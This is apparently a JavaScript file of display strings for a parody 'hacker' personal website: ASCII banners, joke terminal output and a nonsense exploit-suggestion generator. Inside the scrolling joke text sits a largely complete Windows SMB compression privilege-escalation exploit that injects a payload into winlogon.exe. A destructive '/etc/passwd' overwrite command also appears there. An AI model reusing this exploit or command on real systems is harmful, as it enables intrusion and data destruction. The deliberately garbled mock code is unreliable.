const splash_text = "\
     ██╗ ██████╗ ███████╗███████╗███████╗\n\
     ██║██╔═══██╗██╔════╝██╔════╝██╔════╝\n\
     ██║██║   ██║███████╗█████╗  █████╗  \n\
██   ██║██║   ██║╚════██║██╔══╝  ██╔══╝  \n\
╚█████╔╝╚██████╔╝███████║███████╗██║     \n\
 ╚════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝     \n\
                                         \n\
    ██████╗ ███████╗ █████╗ ███╗   ██╗   \n\
    ██╔══██╗██╔════╝██╔══██╗████╗  ██║   \n\
    ██║  ██║█████╗  ███████║██╔██╗ ██║   \n\
    ██║  ██║██╔══╝  ██╔══██║██║╚██╗██║   \n\
    ██████╔╝███████╗██║  ██║██║ ╚████║   \n\
        ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ .co.uk\n";

var login_text = "> Redirecting to www.dark.net/definitelynotjosefdean\n\
> Establishing secure connection:\n\
    - Encrypting ones... <b><font color=\"22ff22\">[SUCCESS]</font></b>\n\
    - Encrypting zeros... <b><font color=\"22ff22\">[SUCCESS]</font></b>\n\
> Initiating 3-factor authentication...\n\
<b><font color=\"ff222\">Error:</font></b> 3 is prime and hard to factor! Manual authentication required";


const denied_popup_text = "\n\n\n\n\n<font color=red>\
                                                                    \n\
           █████   ██████  ██████ ███████ ███████ ███████           \n\
          ██   ██ ██      ██      ██      ██      ██                \n\
          ███████ ██      ██      █████   ███████ ███████           \n\
          ██   ██ ██      ██      ██           ██      ██           \n\
          ██   ██  ██████  ██████ ███████ ███████ ███████           \n\
                                                                    \n\
                                                                    \n\
           ██████  ███████ ███    ██ ██ ███████ ██████              \n\
           ██   ██ ██      ████   ██ ██ ██      ██   ██             \n\
           ██   ██ █████   ██ ██  ██ ██ █████   ██   ██             \n\
           ██   ██ ██      ██  ██ ██ ██ ██      ██   ██             \n\
           ██████  ███████ ██   ████ ██ ███████ ██████              \n</font>\
                                                                    \n\
      Too many incorrect guesses. Please enter your IP address      \n\
      so it can be blacklisted: █                                   \n";


const clippy_hello_text = "It looks like you could use some help compromising this domain. Click me to launch hackerman.exe";


const hacking_startup_text_1 = "\
> hackerman -v -o /dev/nothing -i /proc/clippy\n\
   __ _____  _______ _________  __  ______   _  __\n\
  / // / _ |/ ___/ //_/ __/ _ \\/  |/  / _ | / |/ /\n\
 / _  / __ / /__/ ,< / _// , _/ /|_/ / __ |/    / \n\
/_//_/_/ |_\\___/_/|_/___/_/|_/_/  /_/_/ |_/_/|_/ \n";

const hacking_startup_text_2 = "\n\
Cross-compiling ROP chain from the dark cloud\n\
Virtualising modchip to bypass the BIOS\n\
  - Rasterising\n\
  - Extracting (your copy of winzip will soon expire)\n\
  - Demodulating\n\
  - Open-sourcing\n\
 Manual input required in 3 2 1 . . . [/]\n\
 \n\
> help -q \"How do i use hackerman.exe?\"\n\
Play your keyboard like a piano until you're in the mainframe\n\
Two hands required, dual keyboards optional\n";

const hacking_verbs = [
    'Ready',
    'Downloading',
    'Cross-compiling',
    'Bootstraping',
    'Side-loading',
    'Virtualising',
    'Injecting',
    'Emulating',
    'Escalating',
    'Uploading',
    'Spoofing',
    'Apologising',
    'Satirising',
    'Regenerating',
    'Automating',
    'Defragmenting',
    'Decrypting',
    'Bit-banging',
    'Unpacking',
    'Installing',
    'Patching',
    'Configuring',
    'Scrambling'
];

const access_granted_popup_text = "\n\n\n\n\n\n\
     █████╗  ██████╗ ██████╗███████╗███████╗███████╗        \n\
    ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝        \n\
    ███████║██║     ██║     █████╗  ███████╗███████╗        \n\
    ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║        \n\
    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║        \n\
    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝        \n\
                                                            \n\
 ██████╗ ██████╗  █████╗ ███╗   ██╗████████╗███████╗██████╗ \n\
██╔════╝ ██╔══██╗██╔══██╗████╗  ██║╚══██╔══╝██╔════╝██╔══██╗\n\
██║  ███╗██████╔╝███████║██╔██╗ ██║   ██║   █████╗  ██║  ██║\n\
██║   ██║██╔══██╗██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██║  ██║\n\
╚██████╔╝██║  ██║██║  ██║██║ ╚████║   ██║   ███████╗██████╔╝\n\
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═════╝ \n\n\
                     Welcome: Josef                         \n";


const homepage_header_text = "\n\
     ██╗ ██████╗ ███████╗███████╗███████╗██████╗ ███████╗ █████╗ ███╗   ██╗\n\
     ██║██╔═══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗████╗  ██║\n\
     ██║██║   ██║███████╗█████╗  █████╗  ██║  ██║█████╗  ███████║██╔██╗ ██║\n\
██   ██║██║   ██║╚════██║██╔══╝  ██╔══╝  ██║  ██║██╔══╝  ██╔══██║██║╚██╗██║\n\
╚█████╔╝╚██████╔╝███████║███████╗██║     ██████╔╝███████╗██║  ██║██║ ╚████║\n\
       ╚════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝.co.uk\n\n\
SITEMAP\n";

const homepage_home_text = "\n\
HOME\n\n\
Welcome to JosefDean.co.uk, you're in the mainframe!\n\n\
\n\n\
Use the arrow keys [←][→] or number keys [1][2][3][4][5] to navigate.\n"

const homepage_contact_text = "\n\
CONTACT\n\n\
URLb64(rotate_1(xor_FE(msg)))zcnPy0lfSsjGzUxNzc9IaM7IaMXKet9ITW9IyMRvTMhGb8bIyc1FS\n\
8tIzG_OyMlHSc1FzUnDb03LTEzNRs1IRWh6W8hFb0XIz8ZFb87PSG9OxUZIaG9dyG9IyEVvR0nPzs1vyEZ\n\
vyEfNRs9FzW_DyMVGb1XIz8ZFzUZvSM3PRm_IRm9OzUnIxHrOxUZFz8tIxmlvyEZvz0jDb8hFS81Gb87Iy\n\
U7FxkXLTknNb8nPRc1Gy89JaHpdyG9IyEVvSc3PRM1vw8jFRm9VyM_GRc1Gb8VIz0VFzUhNzU1vxEvNSG_\n\
LRW_Lxm9OzctIzG_Fxs1NaHrfScTPw8ZvzUjGxUbNb0VLz0VvRUvNb05Gzc9Nb0zLRcZvzc_Gy0nDb8tIR\n\
chvRUvNb8ZJyEXGaW9FyEZIb8hGb81DRUbPekVLy87Kb8ZJy87Nxm_Oz0hvzs_Fxs1vw8jFRm9FyM_GRc1\n\
Gb0XIb0rPyWh630nEz8PGb0nLTEVvw8jFRm9FyM_GRc1Gb0xGyMlvxUhNzUZIzc9FS2lvTchvSMhFb0dJz\n\
87Nb8PIxUZvTMtIzM1GxnrLSMbLTc1vyEZvSM3PRm9FS81vTkbNz01vxknIRcZob95Jzc9Ib0VLzW_ORsX\n\
JTm9FRs_Db0bNzMVJz0ZJw2J63kbFyU7Gb87PSG_GycjKzW_IRm9OxUZIaA";

const homepage_exploit_generator_text = "\n\
EXPLOIT GENERATOR\n\n\
Retro-punk hacking is an artistic pursuit, and finding new inspiration can be tricky!\n\
Press ENTER to generate attack suggestions.\n";

const homepage_hackerman_text = "\n\
HACKERMAN\n\n\
Press ENTER to launch hackerman.exe in practice mode\n";

const homepage_shutdown_text = "\n\
SHUTDOWN\n\n\
Press ENTER to shut down the mainframe.";


const exploit_verbs = [
    'Download',
    'Inject',
    'Bootstrap',
    'Escalate',
    'Spoof',
    'Upload',
    'Side-load',
    'Cross-compile',
    'Virtualise',
    'Emulate',
    'Bit-bang',
    'Patch'
];
const exploit_nouns = [
    'a rootkit',
    'a key logger',
    'a packet sniffer',
    'a buffer overflow',
    'a ROP chain',
    'a zero-day',
    'a backdoor',
    'a modchip',
    'illegal hex codes',
    'impossible binary values',
    'a virtual machine',
    'a cracked copy of MS paint',
    'a botnet',
    'the konami code',
    'more RAM',
    'blue shellcode'
];
const exploit_locations = [
    'in the BIOS',
    'on the mainframe',
    'in system32',
    'in the blockchain',
    'into the source code',
    'through the PCIe slots',
    'through the encryption',
    'behind the firewall',
    'from stackoverflow',
    'from the dark cloud',
    'into the wifi',
    'into /dev/null',
    'with a genetic algorithm',
    'in the space between address spaces',
    'through a side channel'
];
const exploit_comments = [
		'They\'ll never see it coming.',
    'It might buy you some cycles.',
    'The modem should be able to take it.',
    'Classic.',
    'Don\'t forget Y2K!',
    'Close your eyes for style points.',
    'It doesn\'t really make sense, but who\'s checking?',
    'It\'s an older move but it checks out.',
    'It\'s a UNIX thing.',
    'You can\'t start a revolution without smashing some stacks.',
    '', '', '', '', '', '', '', '', ''
];


var hacking_main_text = "\
> /bin/secret/backdoor.dll -run\n\
  Launch failed - user error\n\
> /bin/secret/backdoor.dll -run -please\n\
  Unpacking... success\n\
> man hacking | gcc 2>&1 | eval --unsafe\n\
Preheating PCIe express slots... [180C]\n\
Select execution mode:\n\
  1) Spoof a rootkit in the blockchain\n\
  2) Emulate botnet with genetic algorithm\n\
  3) Stuxnet\n\
Selection: 1\n\
Rootkit failure: too many firewalls!\n\
> cat /dev/urandom > /etc/passwd\n\
  Permission denied\n\
> wget https://stackoverflow.com/questions/14780457 > ~/home/$(whoami)/zeroday.py\n\
> python3.11 -i ~/home/$(whoami)/zeroday.py 192.168.3.14159\n\
 Keylogging in the past - new to python3.11!\n\
 (Or any system where you have access to ~/.bash_history)\n\
 [██████████████████████████████████████████████████████████████] (Hits: 0)\n\
 Reverting to 18-bit compatibility mode\n\
 [███████████████████████████████████████████+██████████████████] (Hits: 1)\n\
 Segfault identified!\n\
 Enter exploit to inject:\n\
 > def exploit(username):\n\
     wget www.facebook.com/$username | grep \"My favourite kind of pasta is {x}\" > passwd.txt\n\
     FILE* f = fread(\"passwd.txt\", \"r\");\n\
     let mut pwd:SecretString = match f {\n\
     	NULL => console.log('Download more RAM'),\n\
     	Some(file) => file.read(),\n\
     }\n\
     #define RUN login(target, \"pwd\", mode='leafOnTheWind')\n\
     return RUN\n\
  }\n\
 > Compiling exploit...\n\
 > Printing unrelated metasploit source to pass the time:\n\
 ULONG64 get_handle_addr(HANDLE h) {\n\
	ULONG len = 20;\n\
	NTSTATUS status = (NTSTATUS)0xc0000004;\n\
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;\n\
	HMODULE ntdll = GetModuleHandle(\"ntdll.dll\");\n\
	if (ntdll == NULL) {\n\
		return 0;\n\
	}\n\
	fpNtQuerySystemInformation NtQuerySystemInformation = \n\
	    (fpNtQuerySystemInformation)GetProcAddress(ntdll, \"NtQuerySystemInformation\");\n\
	if (NtQuerySystemInformation == NULL) {\n\
		return 0;\n\
	}\n\
	do {\n\
		len *= 2;\n\
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);\n\
		status = NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, len, &len);\n\
	} while (status == (NTSTATUS)0xc0000004);\n\
	if (status != (NTSTATUS)0x0) {\n\
		return 0;\n\
	}\n\
\n\
	DWORD mypid = GetProcessId(GetCurrentProcess());\n\
	ULONG64 ptrs[1000] = { 0 };\n\
	for (int i = 0; i < pHandleInfo->NumberOfHandles; i++) {\n\
		PVOID object = pHandleInfo->Handles[i].Object;\n\
		ULONG_PTR handle = pHandleInfo->Handles[i].HandleValue;\n\
		DWORD pid = (DWORD)pHandleInfo->Handles[i].UniqueProcessId;\n\
\n\
		if (pid != mypid)\n\
			continue;\n\
		if (handle == (ULONG_PTR)h)\n\
			return (ULONG64)object;\n\
	}\n\
	return 0;\n\
}\n\
\n\
ULONG64 get_process_token() {\n\
	HANDLE token;\n\
	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());\n\
	if (proc == INVALID_HANDLE_VALUE)\n\
		return 0;\n\
	OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token);\n\
	return get_handle_addr(token);\n\
}\n\
int error_exit(SOCKET sock) {\n\
	WSACleanup();\n\
	return EXIT_FAILURE;\n\
}\n\
int send_negotiation(SOCKET sock) {\n\
	int err = 0;\n\
	char response[8] = { 0 };\n\
\n\
	const uint8_t buf[] = {\n\
		/* NetBIOS Wrapper */\n\
		0x00,                   /* session */\n\
		0x00, 0x00, 0xC4,       /* length */\n\
		/* Preauth context */\n\
		0x01, 0x00,             /* type */\n\
		0x26, 0x00,             /* length */\n\
		0x00, 0x00, 0x00, 0x00, /* reserved */\n\
		0x01, 0x00,             /* hash algorithm count */\n\
		0x20, 0x00,             /* salt length */\n\
		0x01, 0x00,             /* hash algorith, SHA512 */\n\
		0x00, 0x00, 0x00, 0x00, /* salt */\n\
		0x00, 0x00, 0x00, 0x00,\n\
		0x00, 0x00,             /* pad */\n\
		/* Compression context */\n\
		0x03, 0x00,             /* type */\n\
		0x0E, 0x00,             /* length */\n\
		0x00, 0x00, 0x00, 0x00, /* reserved */\n\
		0x02, 0x00,             /* compression algorithm count */\n\
		0x00, 0x00,             /* padding */\n\
		0x01, 0x00, 0x00, 0x00, /* flags */\n\
		0x02, 0x00,             /* LZ77 */\n\
		0x03, 0x00,             /* LZ77+Huffman */\n\
		0x00, 0x00, 0x00, 0x00, /* padding */\n\
		0x00, 0x00, 0x00, 0x00\n\
	};\n\
	if ((err = send(sock, (const char*)buf, sizeof(buf), 0)) != SOCKET_ERROR) {\n\
		recv(sock, response, sizeof(response), 0);\n\
	}\n\
	return err;\n\
}\n\
\n\
int send_compressed(SOCKET sock, unsigned char* buffer, ULONG len) {\n\
	int err = 0;\n\
	char response[8] = { 0 };\n\
\n\
	const uint8_t buf[] = {\n\
		0xFC, 0x53, 0x4D, 0x42, /* protocol id */\n\
		0xFF, 0xFF, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow */\n\
	};\n\
	uint8_t* packet = (uint8_t*)malloc(sizeof(buf) + 0x10 + len);\n\
	if (packet == NULL) {\n\
		return error_exit(sock);\n\
	}\n\
	memcpy(packet, buf, sizeof(buf));\n\
	*(uint64_t*)(packet + sizeof(buf)) = 0x1FF2FFFFBC;\n\
	*(uint64_t*)(packet + sizeof(buf) + 0x8) = 0x1FF2FFFFBC;\n\
	memcpy(packet + sizeof(buf) + 0x10, buffer, len);\n\
\n\
	if ((err = send(sock, (const char*)packet, sizeof(buf) + 0x10 + len, 0)) != SOCKET_ERROR) {\n\
		recv(sock, response, sizeof(response), 0);\n\
	}\n\
	free(packet);\n\
	return err;\n\
}\n\
\n\
void inject(PMSF_PAYLOAD pMsfPayload) {\n\
	PROCESSENTRY32 entry;\n\
	entry.dwSize = sizeof(PROCESSENTRY32);\n\
\n\
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\
	int pid = -1;\n\
	if (Process32First(snapshot, &entry) == TRUE) {\n\
		while (Process32Next(snapshot, &entry) == TRUE) {\n\
			if (lstrcmpiA(entry.szExeFile, \"winlogon.exe\") == 0) {\n\
				pid = entry.th32ProcessID;\n\
				break;\n\
			}\n\
		}\n\
	}\n\
	CloseHandle(snapshot);\n\
	if (pid < 0) {\n\
		return;\n\
	}\n\
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n\
	if (hProc == NULL) {\n\
		return;\n\
	}\n\
	LPVOID lpMem = VirtualAllocEx(hProc, NULL, pMsfPayload->dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\
	if (lpMem == NULL) {\n\
		return;\n\
	}\n\
	if (!WriteProcessMemory(hProc, lpMem, &pMsfPayload->cPayloadData, pMsfPayload->dwSize, 0)) {\n\
		return;\n\
	}\n\
	if (!CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpMem, 0, 0, 0)) {\n\
		return;\n\
	}\n\
}\n\
\n\
DWORD exploit(PMSF_PAYLOAD pMsfPayload) {\n\
	WORD wVersionRequested = MAKEWORD(2, 2);\n\
	WSADATA wsaData = { 0 };\n\
	SOCKET sock = INVALID_SOCKET;\n\
	uint64_t ktoken = 0;\n\
	int err = 0;\n\
	if ((err = WSAStartup(wVersionRequested, &wsaData)) != 0) {\n\
		return EXIT_FAILURE;\n\
	}\n\
	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {\n\
		WSACleanup();\n\
		return EXIT_FAILURE;\n\
	}\n\
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\
	if (sock == INVALID_SOCKET) {\n\
		WSACleanup();\n\
		return EXIT_FAILURE;\n\
	}\n\
	SOCKADDR_IN client;\n\
	client.sin_family = AF_INET;\n\
	client.sin_port = htons(445);\n\
	InetPton(AF_INET, \"127.0.0.1\", &client.sin_addr);\n\
\n\
	if (connect(sock, (SOCKADDR*)&client, sizeof(client)) == SOCKET_ERROR) {\n\
		return error_exit(sock);\n\
	}\n\
	if (send_negotiation(sock) == SOCKET_ERROR) {\n\
		return error_exit(sock);\n\
	}\n\
	ULONG buffer_size = 0x1110;\n\
	UCHAR* buffer = (UCHAR*)malloc(buffer_size);\n\
	if (buffer == NULL) {\n\
		return error_exit(sock);\n\
	}\n\
\n\
	ktoken = get_process_token();\n\
	if (ktoken == 0) {\n\
		return EXIT_FAILURE;\n\
	}\n\
\n\
	HMODULE ntdll = GetModuleHandle(\"ntdll.dll\");\n\
	if (ntdll == NULL) {\n\
		return EXIT_FAILURE;\n\
	}\n\
	fpRtlGetCompressionWorkSpaceSize RtlGetCompressionWorkSpaceSize = \n\
	    (fpRtlGetCompressionWorkSpaceSize)GetProcAddress(ntdll, \"RtlGetCompressionWorkSpaceSize\");\n\
	if (RtlGetCompressionWorkSpaceSize == NULL) {\n\
		return EXIT_FAILURE;\n\
	}\n\
	fpRtlCompressBuffer RtlCompressBuffer = (fpRtlCompressBuffer)GetProcAddress(ntdll, \"RtlCompressBuffer\");\n\
	if (RtlCompressBuffer == NULL) {\n\
		return EXIT_FAILURE;\n\
	}\n\
\n\
	memset(buffer, 'A', 0x1108);\n\
	*(uint64_t*)(buffer + 0x1108) = ktoken + 0x40; /* where we want to write */\n\
\n\
	ULONG CompressBufferWorkSpaceSize = 0;\n\
	ULONG CompressFragmentWorkSpaceSize = 0;\n\
	err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS,\n\
		&CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);\n\
\n\
	if (err != STATUS_SUCCESS) {\n\
		return error_exit(sock);\n\
	}\n\
\n\
	ULONG FinalCompressedSize;\n\
	UCHAR compressed_buffer[64];\n\
	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);\n\
	if (lpWorkSpace == NULL) {\n\
		return error_exit(sock);\n\
	}\n\
\n\
	err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, buffer, buffer_size,\n\
		compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);\n\
\n\
	if (err != STATUS_SUCCESS) {\n\
		free(lpWorkSpace);\n\
		return error_exit(sock);\n\
	}\n\
\n\
	if (send_compressed(sock, compressed_buffer, FinalCompressedSize) == SOCKET_ERROR) {\n\
		return error_exit(sock);\n\
	}\n\
\n\
	inject(pMsfPayload);\n\
\n\
	WSACleanup();\n\
	return EXIT_SUCCESS;\n\
}\n\
\n\
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)\n\
{\n\
	BOOL bReturnValue = TRUE;\n\
	switch (dwReason)\n\
	{\n\
	case DLL_QUERY_HMODULE:\n\
		hAppInstance = hinstDLL;\n\
		if (lpReserved != NULL)\n\
		{\n\
			*(HMODULE*)lpReserved = hAppInstance;\n\
		}\n\
		break;\n\
	case DLL_PROCESS_ATTACH:\n\
		hAppInstance = hinstDLL;\n\
		exploit((PMSF_PAYLOAD)lpReserved);\n\
		break;\n\
	case DLL_PROCESS_DETACH:\n\
	case DLL_THREAD_ATTACH:\n\
	case DLL_THREAD_DETACH:\n\
		break;\n\
	}\n\
	return bReturnValue;\n\
}\n";


var LHS_hacking_content_text = "\
MODBUILT_NAMES=    _MODBUILT_NAMES_\n\
MODDISABLED_NAMES= _MODDISABLED_NAMES_\n\
MODOBJS=           _MODOBJS_\n\
MODLIBS=           _MODLIBS_\n\
VERSION=	@VERSION@\n\
srcdir=		@srcdir@\n\
VPATH=		@srcdir@\n\
abs_srcdir=	@abs_srcdir@\n\
abs_builddir=	@abs_builddir@\n\
CC=		@CC@\n\
CXX=		@CXX@\n\
MAINCC=		@MAINCC@\n\
LINKCC=		@LINKCC@\n\
AR=		@AR@\n\
READELF=	@READELF@\n\
SOABI=		@SOABI@\n\
LDVERSION=	@LDVERSION@\n\
LIBEXFILTRATE=	@LIBEXFILTRATE@\n\
GITVERSION=	@GITVERSION@\n\
GITTAG=		@GITTAG@\n\
GITBRANCH=	@GITBRANCH@\n\
PGO_PROF_GEN_FLAG=@PGO_PROF_GEN_FLAG@\n\
PGO_PROF_USE_FLAG=@PGO_PROF_USE_FLAG@\n\
LLVM_PROF_MERGER=@LLVM_PROF_MERGER@\n\
LLVM_PROF_FILE=@LLVM_PROF_FILE@\n\
LLVM_PROF_ERR=@LLVM_PROF_ERR@\n\
DTRACE=         @DTRACE@\n\
DFLAGS=         @DFLAGS@\n\
DTRACE_HEADERS= @DTRACE_HEADERS@\n\
DTRACE_OBJS=    @DTRACE_OBJS@\n\
GNULD=		@GNULD@\n\
SHELL=		/bin/sh\n\
LN=		@LN@\n\
INSTALL=	@INSTALL@\n\
INSTALL_PROGRAM=@INSTALL_PROGRAM@\n\
INSTALL_SCRIPT= @INSTALL_SCRIPT@\n\
INSTALL_DATA=	@INSTALL_DATA@\n\
INSTALL_SHARED= ${INSTALL} -m 755\n\
MKDIR_P=	@MKDIR_P@\n\
MAKESETUP=      $(srcdir)/Modules/makesetup\n\
OPT=		@OPT@\n\
BASECFLAGS=	@BASECFLAGS@\n\
BASECPPFLAGS=	@BASECPPFLAGS@\n\
CONFIGURE_CFLAGS=	@CFLAGS@\n\
CONFIGURE_CFLAGS_NODIST=@CFLAGS_NODIST@\n\
CONFIGURE_LDFLAGS_NODIST=@LDFLAGS_NODIST@\n\
CONFIGURE_CPPFLAGS=	@CPPFLAGS@\n\
CONFIGURE_LDFLAGS=	@LDFLAGS@\n\
PY_CFLAGS=	$(BASECFLAGS) $(OPT) $(CONFIGURE_CFLAGS) $(CFLAGS) $(EXTRA_CFLAGS)\n\
PY_CFLAGS_NODIST=$(CONFIGURE_CFLAGS_NODIST) $(CFLAGS_NODIST) -I$(srcdir)/Include/internal\n\
PY_CPPFLAGS=	$(BASECPPFLAGS) -I. -I$(srcdir)/Include $(CONFIGURE_CPPFLAGS) $(CPPFLAGS)\n\
PY_LDFLAGS=	$(CONFIGURE_LDFLAGS) $(LDFLAGS)\n\
PY_LDFLAGS_NODIST=$(CONFIGURE_LDFLAGS_NODIST) $(LDFLAGS_NODIST)\n\
NO_AS_NEEDED=	@NO_AS_NEEDED@\n\
SGI_ABI=	@SGI_ABI@\n\
CCSHARED=	@CCSHARED@\n\
LINKFORSHARED=	@LINKFORSHARED@\n\
ARFLAGS=	@ARFLAGS@\n\
CFLAGSFORSHARED=@CFLAGSFORSHARED@\n\
PY_STDMODULE_CFLAGS= $(PY_CFLAGS) $(PY_CFLAGS_NODIST) $(PY_CPPFLAGS) $(CFLAGSFORSHARED)\n\
PY_BUILTIN_MODULE_CFLAGS= $(PY_STDMODULE_CFLAGS) -DPy_BUILD_CORE_BUILTIN\n\
PY_CORE_CFLAGS=	$(PY_STDMODULE_CFLAGS) -DPy_BUILD_CORE\n\
PY_CORE_LDFLAGS=$(PY_LDFLAGS) $(PY_LDFLAGS_NODIST)\n\
CFLAGS_ALIASING=@CFLAGS_ALIASING@\n\
\n\
MACHDEP=	@MACHDEP@\n\
MULTIARCH=	@MULTIARCH@\n\
MULTIARCH_CPPFLAGS = @MULTIARCH_CPPFLAGS@\n\
prefix=		@prefix@\n\
exec_prefix=	@exec_prefix@\n\
datarootdir=    @datarootdir@\n\
BINDIR=		@bindir@\n\
LIBDIR=		@libdir@\n\
MANDIR=		@mandir@\n\
INCLUDEDIR=	@includedir@\n\
CONFINCLUDEDIR=	$(exec_prefix)/include\n\
PLATLIBDIR=	@PLATLIBDIR@\n\
SCRIPTDIR=	$(prefix)/$(PLATLIBDIR)\n\
ABIFLAGS=	@ABIFLAGS@\n\
BINLIBDEST=	$(LIBDIR)/exfiltrate$(VERSION)\n\
LIBDEST=	$(SCRIPTDIR)/exfiltrate$(VERSION)\n\
INCLUDEPY=	$(INCLUDEDIR)/exfiltrate$(LDVERSION)\n\
CONFINCLUDEPY=	$(CONFINCLUDEDIR)/exfiltrate$(LDVERSION)\n\
SHLIB_SUFFIX=	@SHLIB_SUFFIX@\n\
EXT_SUFFIX=	@EXT_SUFFIX@\n\
LDSHARED=	@LDSHARED@ $(PY_LDFLAGS)\n\
BLDSHARED=	@BLDSHARED@ $(PY_CORE_LDFLAGS)\n\
LDCXXSHARED=	@LDCXXSHARED@\n\
DESTSHARED=	$(BINLIBDEST)/lib-dynload\n\
EXE=		@EXEEXT@\n\
BUILDEXE=	@BUILDEXEEXT@\n\
UNIVERSALSDK=@UNIVERSALSDK@\n\
EXFILTRATEFRAMEWORK=	@EXFILTRATEFRAMEWORK@\n\
EXFILTRATEFRAMEWORKDIR=	@EXFILTRATEFRAMEWORKDIR@\n\
EXFILTRATEFRAMEWORKPREFIX=	@EXFILTRATEFRAMEWORKPREFIX@\n\
EXFILTRATEFRAMEWORKINSTALLDIR= @EXFILTRATEFRAMEWORKINSTALLDIR@\n\
MACOSX_DEPLOYMENT_TARGET=@CONFIGURE_MACOSX_DEPLOYMENT_TARGET@\n\
@EXPORT_MACOSX_DEPLOYMENT_TARGET@export MACOSX_DEPLOYMENT_TARGET\n\
STRIPFLAG=-s\n\
LIPO_32BIT_FLAGS=@LIPO_32BIT_FLAGS@\n\
OTHER_LIBTOOL_OPT=@OTHER_LIBTOOL_OPT@\n\
RUNSHARED=       @RUNSHARED@\n\
ENSUREPIP=      @ENSUREPIP@\n\
OPENSSL_INCLUDES=@OPENSSL_INCLUDES@\n\
OPENSSL_LIBS=@OPENSSL_LIBS@\n\
OPENSSL_LDFLAGS=@OPENSSL_LDFLAGS@\n\
DIRMODE=	755\n\
EXEMODE=	755\n\
FILEMODE=	644\n\
CONFIG_ARGS=	@CONFIG_ARGS@\n\
\n\
SRCDIRS= 	@SRCDIRS@\n\
SUBDIRSTOO=	Include Lib Misc\n\
CONFIGFILES=	configure configure.ac acconfig.h pyconfig.h.in Makefile.pre.in\n\
DISTFILES=	README.rst ChangeLog $(CONFIGFILES)\n\
DISTDIRS=	$(SUBDIRS) $(SUBDIRSTOO) Ext-dummy\n\
DIST=		$(DISTFILES) $(DISTDIRS)\n\
\n\
LIBRARY=	@LIBRARY@\n\
LDLIBRARY=      @LDLIBRARY@\n\
BLDLIBRARY=     @BLDLIBRARY@\n\
PY3LIBRARY=     @PY3LIBRARY@\n\
DLLLIBRARY=	@DLLLIBRARY@\n\
LDLIBRARYDIR=   @LDLIBRARYDIR@\n\
INSTSONAME=	@INSTSONAME@\n\
\n\
LIBS=		@LIBS@\n\
LIBM=		@LIBM@\n\
LIBC=		@LIBC@\n\
SYSLIBS=	$(LIBM) $(LIBC)\n\
SHLIBS=		@SHLIBS@\n\
DLINCLDIR=	@DLINCLDIR@\n\
DYNLOADFILE=	@DYNLOADFILE@\n\
MACHDEP_OBJS=	@MACHDEP_OBJS@\n\
LIBOBJDIR=	Exfiltrate/\n\
LIBOBJS=	@LIBOBJS@\n\
EXFILTRATE=		exfiltrate$(EXE)\n\
BUILDEXFILTRATE=	exfiltrate$(BUILDEXE)\n\
EXFILTRATE_FOR_REGEN=@EXFILTRATE_FOR_REGEN@\n\
UPDATE_FILE=@EXFILTRATE_FOR_REGEN@ $(srcdir)/Tools/scripts/update_file.py\n\
EXFILTRATE_FOR_BUILD=@EXFILTRATE_FOR_BUILD@\n\
_EXFILTRATE_HOST_PLATFORM=@_EXFILTRATE_HOST_PLATFORM@\n\
BUILD_GNU_TYPE=	@build@\n\
HOST_GNU_TYPE=	@host@\n\
TCLTK_INCLUDES=	@TCLTK_INCLUDES@\n\
TCLTK_LIBS=	@TCLTK_LIBS@\n\
PROFILE_TASK=	@PROFILE_TASK@\n\
COVERAGE_INFO=	$(abs_builddir)/coverage.info\n\
COVERAGE_REPORT=$(abs_builddir)/lcov-report\n\
COVERAGE_REPORT_OPTIONS=--no-branch-coverage --title \"CExfiltrate lcov report\"\n\
\n\
\n\
MODULE_OBJS=	\\n\
		Modules/config.o \\n\
		Modules/getpath.o \\n\
		Modules/main.o \\n\
		Modules/gcmodule.o\n\
IO_H=		Modules/_io/_iomodule.h\n\
IO_OBJS=	\\n\
		Modules/_io/_iomodule.o \\n\
		Modules/_io/iobase.o \\n\
		Modules/_io/fileio.o \\n\
		Modules/_io/bufferedio.o \\n\
		Modules/_io/textio.o \\n\
		Modules/_io/bytesio.o \\n\
		Modules/_io/stringio.o\n\
\n\
LIBFFI_INCLUDEDIR=	@LIBFFI_INCLUDEDIR@\n\
POBJS=		\\n\
		Parser/acceler.o \\n\
		Parser/grammar1.o \\n\
		Parser/listnode.o \\n\
		Parser/node.o \\n\
		Parser/parser.o \\n\
		Parser/token.o \\n\
PARSER_OBJS=	$(POBJS) Parser/myreadline.o Parser/parsetok.o Parser/tokenizer.o\n\
PARSER_HEADERS= \\n\
		$(srcdir)/Include/grammar.h \\n\
